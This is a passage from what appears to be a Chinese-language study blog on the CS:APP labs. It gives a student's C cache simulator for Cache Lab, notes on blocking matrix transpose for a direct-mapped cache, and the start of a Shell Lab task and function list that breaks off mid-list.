class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> valid_bit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tag;</span><br><span class="line"><span class="keyword">int</span> LRU_count;</span><br><span class="line">&#125; Cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Cache_line* lines;</span><br><span class="line">&#125; Cache_set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> S;</span><br><span class="line"><span class="keyword">int</span> E;</span><br><span class="line">Cache_set* sets;</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count=<span class="number">0</span>, miss_count=<span class="number">0</span>,eviction_count=<span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s -- the number of sets</span></span><br><span class="line"><span class="comment">E -- the number of cache lines in one set</span></span><br><span class="line"><span class="comment">b -- the size of one block in one cache line</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span>;  <span class="comment">//print the help messages</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span></span>; <span class="comment">//init caches</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span></span>; <span class="comment">//free caches</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if hit return the index of memory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if there is any empty memort return it&#x27;s index</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//store</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//modify: once store and once load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];   <span class="comment">//store the name of the file</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>;</span><br><span class="line">Cache cache;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">while</span> ((ch = getopt(argc, argv, <span class="string">&quot;vs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (ch) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">verbosity = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">printUsage(argv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line"><span class="built_in">strcpy</span>(buf, optarg);<span class="comment">//copy the address of trace to file</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !s || !E || !b ) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, *argv);</span><br><span class="line">printUsage(argv);</span><br><span class="line">&#125;</span><br><span class="line">initCache(s, E, b, &amp;cache);</span><br><span class="line">replayTrace(s, E, b, buf, verbosity, &amp;cache);</span><br><span class="line">freeCache(&amp;cache);</span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -h         Print this help message.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -v         Optional verbose flag.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nExamples:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cache-&gt;S = <span class="built_in">pow</span>(<span class="number">2.0</span>, s); <span class="comment">// get the sets</span></span><br><span class="line">cache-&gt;E = E;</span><br><span class="line">cache-&gt;sets = (Cache_set*)<span class="built_in">malloc</span>(cache-&gt;S * <span class="keyword">sizeof</span>(Cache_set));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines = (Cache_line*)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(Cache_line));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; cache-&gt;E; j++) </span><br><span class="line">&#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines[j].valid_bit = <span class="number">0</span>;</span><br><span class="line">cache-&gt;sets[i].lines[j].LRU_count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets[i].lines); </span><br><span class="line">cache-&gt;sets[i].lines = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">cache-&gt;sets = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123; <span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">int</span> hitIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">1</span> &amp;&amp; cache-&gt;sets[setIndex].lines[i].tag == tag)&#123; <span class="comment">// valid and the tag matches</span></span><br><span class="line">            hitIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hitIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123;<span class="comment">//find whether there is an empty line in the given set</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> emptyIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">0</span>) &#123;</span><br><span class="line">            emptyIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> emptyIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> hitIndex = getHitIndex(cache, setIndex, tag);<span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">if</span> (hitIndex == <span class="number">-1</span>) &#123; <span class="comment">//one miss</span></span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">int</span> emptyIndex = getEmptyIndex(cache, setIndex, tag);     </span><br><span class="line">        <span class="keyword">if</span> (emptyIndex == <span class="number">-1</span>) &#123;<span class="comment">//need eviction </span></span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count == cache-&gt;E - <span class="number">1</span> &amp;&amp; flag==<span class="number">1</span>)&#123; <span class="comment">//find the least recent used line, and other line LRU_count++</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="comment">// don&#x27;t need eviction</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != emptyIndex)&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">//one hit                        </span></span><br><span class="line">        hit_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tempLRU_count = cache-&gt;sets[setIndex].lines[hitIndex].LRU_count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != hitIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count &lt;  tempLRU_count) &#123;<span class="comment">//less than the hit one&#x27;s LRU</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;<span class="comment">// the hit one&#x27;s LRU is set to zero</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">//store is just like a load</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">// a write is just like one load then one store</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">    store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span> </span>&#123;</span><br><span class="line">FILE *file;                        <span class="comment">// pointer to FILE object </span></span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> type;                          <span class="comment">// L-load S-store M-modify </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address;              <span class="comment">// 64-bit  memory address </span></span><br><span class="line"><span class="keyword">int</span> size;                           <span class="comment">//number of bytes accessed by operation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tag_move_bits = b + s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %lx,%d&quot;</span>, &amp;type, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;<span class="comment">//for every line in the file</span></span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//if it is an instruction, do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> tag = address &gt;&gt; tag_move_bits;<span class="comment">//get the tag</span></span><br><span class="line"><span class="keyword">int</span> setIndex = (address &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);<span class="comment">//get the index</span></span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;<span class="comment">//print detailed info</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>, type, address, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line">store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">modify(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type== <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h4><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p><p><strong>在该实验中</strong>，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p><ol><li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li><li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li></ol><p>代码见GitHub。</p><blockquote><p>参考：</p><p><a href="https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</a></p></blockquote><h3 id="Shell-Lab"><a href="#Shell-Lab" class="headerlink" title="Shell Lab"></a>Shell Lab</h3><p>任务：</p><ul><li><p>eval: 主要功能是解析cmdline，并且运行. [70 lines]</p></li><li><p>builtin cmd: 辨识和解析出bulidin命令: quit, fg, bg, and jobs. [25lines]</p></li><li><p>do bgfg: 实现bg和fg命令. [50 lines]</p></li><li><p>waitfg: 实现等待前台程序运行结束. [20 lines]</p></li><li><p>sigchld handler: 响应SIGCHLD. 80 lines]</p></li><li><p>sigint handler: 响应 SIGINT (ctrl-c) 信号. [15 lines]</p></li><li><p>sigtstp handler: 响应 SIGTSTP (ctrl-z) 信号. [15 lines]</p></li></ul><p>给出的函数：</p><ul><li><code>int parseline(const char *cmdline,char **argv)</code>：获取参数列表<code>char **argv</code>，返回是否为后台运行命令（<code>true</code>）。</li><li><code>void clearjob(struct job_t *job)</code>：清除<code>job</code>结构。</li><li><code>void initjobs(struct job_t *jobs)</code>：初始化<code>jobs</code>链表。</li><li><code>void maxjid(struct job_t *jobs)</code>：返回<code>jobs</code>链表中最大的<code>jid</code>号。</li><li><code>int addjob(struct job_t *jobs,pid_t pid,int state,char *cmdline)</code>：在<code>jobs</code>链表中添加<code>job</code></li><li><code>int deletejob(struct job_t *jobs,pid_t pid)</code>：在<code>jobs</code>链表中删除<code>pid</code>的<code>job</code>。</li><li><code>pid_t fgpid(struct job_t *jobs)</code>：返回当前前台运行<code>job</code>的<code>pid</code>号。</li><li><code>struct job_t *getjobpid(struct job_t *jobs,pid_t pid)</code>：返回<code>pid</code>号的<code>job</code>。</li><li><code>struct job_t *getjobjid(struct job_t *jobs,int jid)</code>：返回<code>jid</code>号的<code>job</code>。</li><li><code>int pid2jid(pid_t pid)</code>：将<code>pid</code>号转化为<code>jid</code>。</li><li><code>void listjobs(struct job_t *jobs)</code>：打印<code>jobs</code>。</li><li><code>void sigquit_handler(int sig)</code>：处理<code>SIGQUIT</code>信号。</li></ul><p>tsh应有的内置命令：</p><ul><li>quit: 退出当前shell</li><li>jobs: 列出所有后台运行的工作</li><li>bg <job>: 这个命令将会向<job>代表的工作发送SIGCONT信号并放在后台运行，<job>可以是一个PID也可以是一个JID（job ID）。</li><li>fg <job>: 